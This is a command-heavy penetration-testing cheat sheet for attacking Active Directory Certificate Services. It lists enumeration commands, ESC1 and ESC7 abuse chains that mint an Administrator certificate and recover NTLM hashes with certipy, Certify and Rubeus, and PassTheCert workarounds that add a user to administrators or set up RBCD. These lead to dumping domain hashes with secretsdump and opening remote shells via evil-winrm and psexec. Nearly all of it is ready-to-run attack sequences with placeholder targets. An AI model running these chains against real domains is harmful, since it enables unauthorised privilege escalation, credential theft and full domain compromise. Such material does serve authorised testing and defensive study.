---
title: "ADCS"
date: 2024-7-23
tags: ["certificate services", "active driectory", "ad", "Windows", "certify", "adcs", "esc", "PassTheCert"]
---

---
### Enum (From Linux)

{{< tab set1 tab1 active >}}certipy-ad{{< /tab >}}
{{< tab set1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
certipy-ad find -u <USER> -p <PASSWORD> -target <TARGET> -text -stdout -vulnerable
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```bash
nxc ldap <TARGET> -u <USER> -p <PASSWORD> -M adcs
```

</div>

{{< /tabcontent >}}

### Enum (From Windows)

{{< tab set2 tab1 active >}}powershell{{< /tab >}}
{{< tab set2 tab2 >}}certify{{< /tab >}}
{{< tab set2 tab3 >}}ADCSTemplate{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```powershell
# Check ADCS service
net start | findstr /i cert
```

```powershell
# Check env
certutil
```

```powershell
# List cert templates
certutil -catemplates
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

<div>

```powershell
# Get info of each template
.\certify.exe find
```

```powershell
# Find vuln templates
.\certify.exe find /vulnerable /currentuser
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab3 >}}

<div>

```powershell
import-module .\ADCSTemplate.psm1
```

```powershell
get-adcstemplate | fl displayname
```

<small>*Ref: [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)*</small>

</div>

{{< /tabcontent >}}

<br>

---

### Request a certificate of current user

{{< tab set3 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set3 tab1 >}}

<div>

```powershell
.\certify.exe request /ca:<CONFIG> /template:User
```

```powershell
# Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```powershell
# Get NTLM hash
.\rubeus.exe asktgt /user:<USER> /certificate:cert.pfx /getcredentials /show /nowrap
```

</div>

{{< /tabcontent >}}

<br>

---

### ESC1

<div>

```
+----------------------------------------------------------+
| Enabled                        : True                    |
| Client Authentication          : True                    |
| Enrollee Supplies Subject      : True                    |
| Certificate Name Flag          : EnrolleeSuppliesSubject |
| Requires Management Approval   : False                   |
| Authorized Signatures Required : 0                       |
+----------------------------------------------------------+
```

</div>

#### Abuse #1: Add smartcard logon

{{< tab set4 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

<div>

```powershell
. .\PowerView.ps1
```

```powershell
. .\ADCS.ps1
```

```powershell
# Add smartcart logon
Get-SmartCardCertificate -Identity Administrator -TemplateName <VULN_TEMPLATE> -NoSmartCard -Verbose
```

```powershell
# Get Cert_Thumbprint
Get-ChildItem cert:\currentuser\my -recurse
```

```powershell
# Get NTLM hash
.\rubeus.exe asktgt /user:Administrator /certificate:<Thumbprint> /getcredentials /show /nowrap
```

```bash
# Remote
impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
```

<small>*Ref: [PoshADCS](https://github.com/cfalta/PoshADCS)*</small>

</div>

{{< /tabcontent >}}

#### Abuse #2: Set alternative name

{{< tab set5 tab1 active >}}Linux{{< /tab >}}
{{< tab set5 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set5 tab1 >}}
```bash
# Generate Cert with altname
certipy-ad req -u <USER> -p <PASSWORD> -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template <VULN_TEMPLATE>
```

```bash
# Get NTLM hash
sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
```

```bash
# Remote
evil-winrm -i <TARGET> -u administrator -H <HASH>
```
{{< /tabcontent >}}
{{< tabcontent set5 tab2 >}}
```powershell
# Generate Cert with altname
.\Certify.exe request /ca:<CA_NAME> /template:<VULN_TEMPLATE> /altname:administrator
```

```bash
# Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```powershell
# Get NTLM hash
.\rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

```bash
# Remote
evil-winrm -i <TARGET> -u administrator -H <HASH>
```
{{< /tabcontent >}}

#### Abuse #3: Set msPKI-Certificate-Name-Flag

{{< tab set6 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set6 tab1 >}}

<div>

```powershell
import-module .\ADCSTemplate.psm1
```

```powershell
Export-ADCSTemplate -displayName <VULN_TEMPLATE> > template.json
```

```powershell
$template = cat template.json -raw | ConvertFrom-Json
```

```powershell
$template.'msPKI-Certificate-Name-Flag' = 0x1
```

```powershell
$template | ConvertTo-Json | Set-Content template_mod.json
```

```powershell
New-ADCSTemplate -DisplayName "vuln_esc1" -Publish -JSON (cat template_mod.json -raw)
```

```powershell
Set-ADCSTemplateACL -DisplayName "vuln_esc1" -type allow -identity '<DOMAIN>\<USER>' -enroll
```

```bash
# Generate Cert with altname
certipy-ad req -u <USER> -p <PASSWORD> -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template vuln_esc1
```

```bash
# Get NTLM hash
sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
```

```bash
# Remote
evil-winrm -i <TARGET> -u administrator -H <HASH>
```

<small>*Ref: [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)*</small>

</div>

{{< /tabcontent >}}

<br>

---

### ESC7

<div>

```
+---------------------+
| Access Right        |
|=====================|
| Manage CA           |
| Manage Certificates |
+---------------------+
```

</div>

<br>

<div>

{{< tab set7 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set7 tab1 >}}

```bash
# Use ManageCA privilege to add manage certificates permission
certipy-ad ca -ca <CA_NAME> -add-officer <USER> -u <USER>@<DOMAIN> -p <PASSWORD>
```

```bash
# Check
certipy-ad find -dc-ip <DC> -ns <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> -vulnerable -stdout
```

```bash
# Request Cert based on SubCA (Take note: Request ID)
certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -template SubCA -upn administrator@<DOMAIN> -u <USER>@<DOMAIN> -p <PASSWORD>
```

```bash
# Issue request using ManageCA and Manage Certificates privilege
certipy-ad ca -ca <CA_NAME> -issue-request <Request_ID> -u <USER>@<DOMAIN> -p <PASSWORD>
```

```bash
certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -retrieve <Request_ID> -u <USER>@<DOMAIN> -p <PASSWORD>
```

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
```

```bash
# Remote
evil-winrm -i <TARGET> -u administrator -H <HASH>
```

</div>

{{< /tabcontent >}}

<br>

---

### Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP

#### Create key and crt from pfx

<div>

```bash
# Create key from pfx
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
```

```bash
# Create cert from pfx
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
```

</div>

{{< tab set8 tab1 active >}}LDAP Shell{{< /tab >}}
{{< tab set8 tab2 >}}RBCD{{< /tab >}}
{{< tabcontent set8 tab1 >}}

<div>

```bash
# LDAP shell
python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

```bash
# Add user to administrators group within the ldap shell
add_user_to_group <USER> administrators
```

```bash
# Remote
evil-winrm -i <TARGET_DOMAIN> -u <USER> -p <PASSWORD>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set8 tab2 >}}

<div>

```bash
python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'Evil_Computer$' -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

```bash
sudo ntpdate -s <DC> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<PASSWORD>'
```

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-secretsdump <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-ntlm
```

```bash
# Remote
evil-winrm -i <TARGET_DOMAIN> -u administrator -H <HASH>
```

</div>

{{< /tabcontent >}}

<small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>

<br>